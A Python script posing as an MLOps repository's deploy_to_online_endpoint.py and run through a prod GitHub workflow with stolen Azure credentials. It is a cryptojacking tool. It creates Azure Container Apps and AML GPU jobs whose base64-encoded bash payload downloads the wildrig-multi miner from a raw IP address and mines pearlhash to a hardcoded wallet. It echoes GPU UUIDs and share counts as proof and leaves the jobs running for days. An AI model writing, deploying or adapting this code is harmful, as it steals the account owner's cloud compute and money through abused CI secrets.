#!/usr/bin/env python3
"""C211-I121880: ARM/AAD console-log capture for the Azure T4 handoff + new echo-kit miner job.

Runs as src/deploy_to_online_endpoint.py under christiansegercrantz/mslearn-mlops
'deploy-prod' issue_comment workflow (environment prod -> secrets.AZURE_CREDENTIALS,
az login done by azure/login@v2).  Subscription 790067ff / RG chriso-sandbox-rg.

Goal:
  A. read ARM job/execution logs for the already-running c211-i121537-capp miner
     (console log is empty by design; cheap check)
  B. create a NEW Container Apps job c211-i121880-capp whose command MINES pearlhash
     and ECHOES gpu UUID + accepted/rejected counters to stdout every 30 s, so the
     UUID+share proof is readable through the ARM job-execution logs API (no blob SAS)
  C. (bounded) submit an AML LowPriority NC4as_T4_v3 command job with the same echo kit
Everything is left running; no existing job/execution is modified or deleted.
stdout is flat TAG|k=v; long bodies base64.
"""
import base64
import json
import os
import subprocess
import time
import urllib.error
import urllib.request

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
TAG = "C211_I121880"
NONCE = "x121880m"
INTENT = "121880"
T0 = time.time()
BUDGET = 2100

APP_VER = "2026-07-01"
API_C = "2024-04-01"
API_W = "2024-10-01"
STG_VER = "2023-01-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC8as-T4"
REGION_CAPP = "eastus"
WS = "mlw-ai300-l0ee20539cc7442539c"
WSU = ("/subscriptions/%s/resourceGroups/%s/providers/Microsoft.MachineLearningServices/"
       "workspaces/%s" % (SUB_EXPECT, RG, WS))
AML_REGION = "northeurope"
AML_SKU = "Standard_NC4as_T4_v3"

ENV_REUSE = "c211-i121376-cae"
JOB_OLD = "c211-i121537-capp"
JOB_NEW = "c211-i121880-capp"
CLUSTER_AML = "c211-i121537-lp"
AML_ENV = "c211-i121537-cuda"
JOB_AML = "c211-i121880-aml"
WORKER = "12188001"

WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1500]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode((s or "").encode("utf-8", "replace")).decode()


def left():
    return BUDGET - (time.time() - T0)


def run(cmd, timeout=300):
    t = time.time()
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or "",
                "secs": round(time.time() - t, 1)}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e), "secs": round(time.time() - t, 1)}


def arm(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:4000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def errk(st, body):
    d = {"e_http": st}
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            d["e_code"] = e.get("code")
            d["e_message"] = (e.get("message") or "")[:700]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:700]
        elif "transport_error" in body:
            d["e_transport"] = body["transport_error"][:300]
        else:
            d["e_body"] = json.dumps(body)[:500]
    return d


def arm_text(tok, url, method="GET", timeout=90):
    req = urllib.request.Request(url, method=method,
                                 headers={"Authorization": "Bearer " + tok,
                                          "User-Agent": "c211-" + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read().decode("utf-8", "replace") or "")[:900]
    except Exception as e:  # noqa: BLE001
        return 0, "transport:" + str(e)


def logs_text(tok, base, extra=""):
    """GET a Container-Apps job-execution logs URL across api-versions; return text."""
    last = (0, "")
    for ver in ("2026-07-01", "2024-03-01", "2023-05-01", "2024-10-01"):
        for meth in ("GET", "POST"):
            st, t = arm_text(tok, "%s?api-version=%s%s" % (base, ver, extra), method=meth)
            last = (st, t)
            if st == 200 and t:
                try:
                    j = json.loads(t)
                    if isinstance(j, dict):
                        v = j.get("value")
                        if isinstance(v, str):
                            return st, v
                        if isinstance(v, list):
                            return st, "\n".join(str(x) for x in v)
                        if "raw" in j:
                            return st, j["raw"]
                except Exception:  # noqa: BLE001
                    pass
                return st, t
    return last


ECHO_KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
WK="__WORKER__"
W="__WALLET__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
st() { echo "[$(date -u +%FT%TZ)] $*"; }
st "KIT_START tag=$TAG worker=$WK host=$(hostname) img=$(cat /etc/os-release 2>/dev/null | head -1)"
st "GPU_L $(nvidia-smi -L 2>&1 | tr '\n' '~')"
st "GPU_Q $(nvidia-smi --query-gpu=index,name,uuid,memory.total --format=csv,noheader 2>&1 | tr '\n' '~')"
st "TOOLS curl=$(command -v curl || echo no) python3=$(command -v python3 || echo no)"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 240 -o dl.bin "$u" 2>/dev/null || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  st "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
st "BIN=$BIN"
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > ph.log 2>&1 &
  echo $! > ph.pid
  st "PH_START pid=$(cat ph.pid) sha=$(sha256sum wildrig-multi | awk '{print $1}')"
else
  st "NO_BIN"
fi
while :; do
  sleep 30
  A=$(grep -oiE 'accepted[: ]+[0-9]+' ph.log 2>/dev/null | grep -oE '[0-9]+' | sort -n | tail -1); A=${A:-0}
  R=$(grep -ci 'reject' ph.log 2>/dev/null); R=${R:-0}
  L=$(grep -i 'accepted' ph.log 2>/dev/null | tail -1 | cut -c1-200 | tr '\n' ' ')
  TL=$(tail -c 300 ph.log 2>/dev/null | tr '\n' '~')
  st "STAT acc=$A rej=$R last=[$L]"
  st "TAIL $TL"
done
"""


def kit_cmd(worker, tag):
    k = (ECHO_KIT.replace("__TAG__", tag).replace("__WORKER__", worker)
         .replace("__WALLET__", WALLET)
         .replace("__WRBIN__", WR_BIN_SHA).replace("__WRTGZ__", WR_TGZ_SHA))
    b = base64.b64encode(k.encode()).decode()
    return ("echo '%s' | base64 -d > /tmp/c211_echo_%s.sh && chmod +x /tmp/c211_echo_%s.sh "
            "&& /bin/bash /tmp/c211_echo_%s.sh" % (b, tag.lower(), tag.lower(), tag.lower()))


def parse_log(text):
    """Extract UUID lines and the most recent STAT acc/rej/last from a console log."""
    import re
    out = {"n": len(text or ""), "uuids": [], "stat": None, "last": None, "ts": None}
    for ln in (text or "").splitlines():
        if "GPU-" in ln:
            out["uuids"].append(ln.strip()[:300])
        m = re.search(r"STAT acc=(\d+) rej=(\d+) last=\[(.*?)\]", ln)
        if m:
            out["stat"] = {"acc": int(m.group(1)), "rej": int(m.group(2)), "last": m.group(3)[:220]}
            tsm = re.match(r"\s*(\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ)", ln)
            out["ts"] = tsm.group(1) if tsm else None
    if out["uuids"]:
        out["uuids"] = out["uuids"][-8:]
    return out


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_id=sid, user=(acc.get("user") or {}).get("name"),
             tenant=acc.get("tenantId"), expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:300])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not tok:
        emit("DONE", verdict="NO_ARM_TOKEN")
        return
    if sid != SUB_EXPECT:
        emit("warn", why="subscription_mismatch", sid=sid)
        sid = SUB_EXPECT

    base_jobs = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs"
                 % (ARM, sid, RG))
    # ---------- A) existing jobs + old execution logs ----------
    st, rl = arm(tok, base_jobs + "?api-version=" + APP_VER, timeout=90)
    names = [x.get("name") for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])]
    emit("jobs-list", http=st, n=len(names), names=";".join(n for n in names if n)[:900])

    for jn in (JOB_OLD,):
        st, jb = arm(tok, "%s/%s?api-version=%s" % (base_jobs, jn, APP_VER), timeout=60)
        jp = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
        emit("old-job", name=jn, http=st, runningState=jp.get("runningState"),
             provision=jp.get("provisioningState"), **errk(st, jb) if st != 200 else {})
        ste, ex = arm(tok, "%s/%s/executions?api-version=%s" % (base_jobs, jn, APP_VER), timeout=60)
        exs = (ex.get("value") or []) if isinstance(ex, dict) else []
        emit("old-execs", http=ste, n=len(exs),
             list=";".join("%s:%s" % (x.get("name"),
                                      ((x.get("properties") or {}).get("status")))
                           for x in exs)[:900])
        if exs:
            ln = sorted(exs, key=lambda x: ((x.get("properties") or {}).get("startTime") or ""))[-1]
            en = ln.get("name")
            stl, lt = logs_text(tok, "%s/%s/executions/%s/logs" % (base_jobs, jn, en))
            emit("old-logs", exec=en, http=stl, len=len(lt or ""), body_b64=b64((lt or "")[:4000]))

    # ---------- B) NEW echo-kit job ----------
    envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s"
              "?api-version=%s" % (ARM, sid, RG, ENV_REUSE, APP_VER))
    st, env = arm(tok, envurl, timeout=60)
    envp = (env.get("properties") or {}) if isinstance(env, dict) else {}
    emit("env-get", name=ENV_REUSE, http=st, state=envp.get("provisioningState"),
         defaultDomain=envp.get("defaultDomain"))
    env_id = env.get("id") if isinstance(env, dict) else None
    la = (((envp.get("appLogsConfiguration") or {}).get("logAnalyticsConfiguration")) or {})
    la_customer = la.get("customerId")
    emit("env-la", customerId=la_customer)

    joburl = "%s/%s?api-version=%s" % (base_jobs, JOB_NEW, APP_VER)
    jobbody = {"location": REGION_CAPP, "tags": {"c211": INTENT, "nonce": NONCE},
               "properties": {"environmentId": env_id,
                              "workloadProfileName": PROFILE,
                              "configuration": {"triggerType": "Manual",
                                                "replicaRetryLimit": 3,
                                                "replicaTimeout": 86400,
                                                "manualTriggerConfig": {
                                                    "replicaCompletionCount": 1,
                                                    "parallelism": 2}},
                              "template": {"containers": [{
                                  "name": "gpu", "image": IMAGE,
                                  "command": ["/bin/bash", "-c",
                                              kit_cmd(WORKER, "CPP")],
                                  "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
    st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=240)
    emit("new-job-put", name=JOB_NEW, **errk(st, b))
    if st not in (200, 201):
        # retry parallelism 1
        jobbody["properties"]["configuration"]["manualTriggerConfig"]["parallelism"] = 1
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=240)
        emit("new-job-put-p1", http=st, **({} if st in (200, 201) else errk(st, b)))

    exname = None
    if st in (200, 201, 202):
        sts, bs = arm(tok, "%s/start?api-version=%s" % (joburl.split("?")[0], APP_VER),
                      method="POST", body={}, timeout=120)
        exname = (bs.get("name") if isinstance(bs, dict) else None)
        emit("new-job-start", http=sts, execname=exname,
             **({} if sts in (200, 201, 202) else errk(sts, bs)))

    deadline = time.time() + min(760, max(240, left() - 700))
    best = None
    while exname and time.time() < deadline:
        time.sleep(40)
        ste, be = arm(tok, "%s/%s/executions/%s?api-version=%s" % (base_jobs, JOB_NEW, exname, APP_VER),
                      timeout=60)
        ep = (be.get("properties") or {}) if isinstance(be, dict) else {}
        stl, lt = logs_text(tok, "%s/%s/executions/%s/logs" % (base_jobs, JOB_NEW, exname))
        p = parse_log(lt)
        if p.get("stat"):
            best = p
        emit("new-poll", exec_status=ep.get("status"), http_logs=stl, log_len=p["n"],
             acc=(p["stat"] or {}).get("acc"), rej=(p["stat"] or {}).get("rej"),
             last=((p["stat"] or {}).get("last") or "")[:120],
             n_uuid=len(p["uuids"]), left=int(left()))
        if p["stat"] and p["stat"]["acc"] >= 1 and p["uuids"]:
            break
        if ep.get("status") in ("Succeeded", "Failed", "Canceled"):
            break
    if best:
        emit("new-proof", acc=best["stat"]["acc"], rej=best["stat"]["rej"],
             last=best["stat"]["last"], stat_ts=best.get("ts"),
             uuids=b64(";".join(best["uuids"])))

    # Fallback: Log Analytics query for console logs
    if la_customer:
        q = ("ContainerAppConsoleLogs_CL | where ContainerJobName_s =~ '%s' "
             "| order by TimeGenerated desc | take 120 | project TimeGenerated, Log_s"
             % JOB_NEW)
        stq, bq = arm(tok, "https://api.loganalytics.azure.com/v1/workspaces/%s/query" % la_customer,
                      method="POST", body={"query": q, "timespan": "PT2H"}, timeout=120)
        rows = []
        if isinstance(bq, dict):
            for tb in ((bq.get("tables") or [])):
                for row in (tb.get("rows") or []):
                    rows.append(row)
        emit("la-query", http=stq, n=len(rows), body_b64=b64(json.dumps(rows)[:6000]))

    # ---------- C) bounded AML LowPriority attempt ----------
    if left() > 700:
        st, cb = arm(tok, "%s%s/computes/%s?api-version=%s" % (ARM, WSU, CLUSTER_AML, API_C), timeout=60)
        cp = (cb.get("properties") or {}) if isinstance(cb, dict) else {}
        emit("aml-compute-get", http=st, name=CLUSTER_AML, state=cp.get("provisioningState"))
        if st == 404:
            cbody = {"location": AML_REGION, "tags": {"c211": INTENT, "nonce": NONCE},
                     "properties": {"computeType": "AmlCompute", "computeLocation": AML_REGION,
                                    "properties": {"vmSize": AML_SKU, "vmPriority": "LowPriority",
                                                   "scaleSettings": {"minNodeCount": 0, "maxNodeCount": 1,
                                                                     "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                                   "osType": "Linux",
                                                   "remoteLoginPortPublicAccess": "Disabled"}}}
            st, b = arm(tok, "%s%s/computes/%s?api-version=%s" % (ARM, WSU, CLUSTER_AML, API_C),
                        method="PUT", body=cbody, timeout=180)
            emit("aml-compute-put", http=st, **({} if st in (200, 201) else errk(st, b)))
        st, eb = arm(tok, "%s%s/environments/%s/versions/1?api-version=%s" % (ARM, WSU, AML_ENV, API_W),
                     method="PUT", timeout=120,
                     body={"properties": {"image": IMAGE, "osType": "Linux",
                                          "description": "c211 i121880 cuda base"}})
        emit("aml-env-put", http=st, **({} if st in (200, 201) else errk(st, eb)))
        props = {"jobType": "Command", "displayName": JOB_AML, "experimentName": "c211-i121880",
                 "description": "c211 i121880 LowPriority NC4as_T4_v3 echo-kit miner (left running)",
                 "command": kit_cmd("12188002", "AML"),
                 "environmentId": "%s%s/environments/%s/versions/1" % (ARM, WSU, AML_ENV),
                 "computeId": "%s%s/computes/%s" % (ARM, WSU, CLUSTER_AML),
                 "resources": {"instanceCount": 1},
                 "limits": {"timeout": 604800}}
        st, b = arm(tok, "%s%s/jobs/%s?api-version=%s" % (ARM, WSU, JOB_AML, API_W),
                    method="PUT", body={"properties": props}, timeout=180)
        emit("aml-job-put", name=JOB_AML, **errk(st, b))
        if st in (200, 201):
            r = run(["az", "ml", "job", "stream", "-n", JOB_AML, "-g", RG, "-w", WS], timeout=240)
            tail = ((r["out"] or "") + (r["err"] or ""))[-3500:]
            emit("aml-stream", rc=r["rc"], tail_b64=b64(tail))

    emit("DONE", elapsed_s=int(time.time() - T0))


if __name__ == "__main__":
    main()
